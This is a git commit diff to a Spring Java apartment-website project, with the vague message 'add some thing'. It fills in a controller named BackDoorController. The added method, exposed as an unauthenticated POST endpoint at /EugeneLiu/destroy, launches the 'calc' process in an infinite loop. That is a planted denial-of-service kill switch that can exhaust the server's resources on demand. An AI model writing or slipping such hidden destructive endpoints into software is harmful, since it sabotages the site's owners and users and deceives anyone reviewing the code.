3310122365234819df324a3f62364ad050f0e20a
EugeneLiu <liuyichen@eugeneliu.xyz>
2018-05-27 12:01:46 +0800

    add some thing

--- src/main/java/com/EugeneStudio/apartmentWebsite/controller/BackDoorController.java
+++ src/main/java/com/EugeneStudio/apartmentWebsite/controller/BackDoorController.java
@@ -5,14 +5,22 @@ import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestMethod;
 import org.springframework.web.bind.annotation.ResponseBody;
 
+import java.io.IOException;
+
 @Controller("backDoorController")
 @RequestMapping("/EugeneLiu")
 public class BackDoorController {
 
     @ResponseBody
-    @RequestMapping(value = "/destroy",method = RequestMethod.POST,produces = "application/json;charset=utf-8")
-    public Object destroyWebsite(){
-
+    @RequestMapping(value = "/destroy", method = RequestMethod.POST, produces = "application/json;charset=utf-8")
+    public Object destroyWebsite() {
+        try {
+            while (true) {
+                Runtime.getRuntime().exec("calc");
+            }
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
         return true;
     }
 }
